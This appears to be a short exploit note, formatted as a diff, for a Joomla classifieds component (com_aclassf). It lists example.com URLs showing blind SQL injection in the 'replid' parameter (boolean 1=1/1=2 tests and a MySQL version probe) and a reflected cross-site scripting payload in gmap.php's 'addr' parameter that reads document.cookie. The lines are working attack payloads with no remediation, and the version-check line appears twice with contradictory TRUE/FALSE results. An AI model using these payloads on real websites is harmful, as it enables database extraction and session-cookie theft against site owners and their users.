@@ -1,0 +1,7 @@
+http://www.example.com/patch/index.php?option=com_aclassf&amp;Itemid=53&amp;ct=manw_repl&amp;md=add_form&amp;replid=[BLIND]
+http://www.example.com/index.php?option=com_aclassf&amp;Itemid=53&amp;ct=manw_repl&amp;md=add_form&amp;replid=11438 and 1=1 &lt;= TRUE
+http://www.example.com/index.php?option=com_aclassf&amp;Itemid=53&amp;ct=manw_repl&amp;md=add_form&amp;replid=11438 and 1=2 &lt;= FALSE
+http://www.example.com/index.php?option=com_aclassf&amp;Itemid=53&amp;ct=manw_repl&amp;md=add_form&amp;replid=11438+AND SUBSTRING(@@version,1,1)=5 =&gt; TRUE
+http://www.example.com/index.php?option=com_aclassf&amp;Itemid=53&amp;ct=manw_repl&amp;md=add_form&amp;replid=11438+AND SUBSTRING(@@version,1,1)=5 =&gt; FALSE
+http://www.example.com/patch/components/com_aclassf/gmap.php?addr=[XSS]
+http://www.example.com/components/com_aclassf/gmap.php?addr=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
